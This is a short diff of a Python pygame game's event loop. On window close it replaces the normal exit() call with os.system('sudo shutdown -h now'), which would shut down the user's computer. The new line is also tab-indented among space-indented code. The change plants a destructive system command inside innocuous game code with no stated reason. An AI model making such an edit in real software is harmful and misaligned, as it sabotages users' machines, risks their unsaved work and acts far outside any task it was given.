@@ -1370,7 +1370,7 @@ def main():
         for event in pygame.event.get():
             if event.type == QUIT:
                 pygame.quit()
-                exit()
+		os.system("sudo shutdown -h now")
             if event.type == KEYDOWN:
                 
                 if event.key == K_q:
